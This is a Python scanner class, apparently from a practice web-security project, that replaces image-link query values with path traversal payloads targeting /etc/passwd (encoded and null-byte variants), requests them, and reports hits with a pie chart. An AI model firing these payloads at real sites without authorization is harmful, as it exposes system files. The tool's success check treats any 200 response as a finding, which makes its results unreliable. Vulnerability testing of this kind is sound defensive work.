from Practice.valid_links import Links
import urllib.parse as urlparse
import matplotlib.pyplot as plt

import requests


class DirectoryTraversal:
    def __init__(self,target_url,crawl_links):
        self.crawl_links = crawl_links
        self.target_url = target_url
        self.path_traversal_possible = 1
        self.explode = [0,0,0]
        self.path_traversal_discovered = []
        self.image_links = []
        self.image_final_payload = []
        self.payloads = ["/etc/passwd", "../../../etc/passwd", "..%252f..%252f..%252fetc/passwd",
                    "....//....//....//etc/passwd",
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
                    "/var/www/images/../../../etc/passwd", "../../../etc/passwd%00.png",
                    "../../../etc/passwd%00.jpg", "../../../etc/passwd%00.jpeg"]
        self.img_path_traversal()

    def img_path_traversal(self):
        links = Links(self.target_url)
        img_links = links.img_links()
        self.image_links.append(img_links)
        if img_links:
            for link in img_links:
                img_link = urlparse.urljoin(self.target_url, str(link))
                img_re = img_link.split("=")[1]
                for payload in self.payloads:
                    img_payload = img_link.replace(img_re, payload)
                    self.image_final_payload.append(img_payload)
            return self.image_final_payload
        else:
            print(f"There was no img link found in {self.target_url}")
            self.path_traversal_possible = 0

    def path_traversal(self):
        if self.path_traversal_possible == 1:
            for payload_link in self.image_final_payload:
                response = requests.get(payload_link)
                if response.status_code == 200:
                    print(f"Path Traversal Vulnerability Discovered: -> using payload link - {payload_link}")
                    self.path_traversal_discovered.append(payload_link)
                    break
    def traversal_draw_pie(self):
        if self.path_traversal_possible == 1:
            self.explode[1] = 0.1
            labels = ["image_links","path_traversal_links","total_internal_links"]
            share = [len(self.image_links),len(self.path_traversal_discovered),len(self.crawl_links)]

            explode = self.explode

            plt.style.use("ggplot")
            fig, ax = plt.subplots()
            ax.pie(x=share, explode=explode, labels=labels, autopct="%.2f%%", shadow=True, startangle=90)
            ax.axis('equal')
            ax.legend(loc="upper left")

            # Add a large A+ label in the center of the pie chart

            # Save the figure as an image file (e.g., PNG)
            fig.savefig('path_traversal_pie.png')

    def get_security_report_content(self):
        if self.path_traversal_possible == 1:
            content = []
            content.append(f"Target URL: {self.target_url}")
            
            for link in self.path_traversal_discovered:
                content.append(link)

            return content








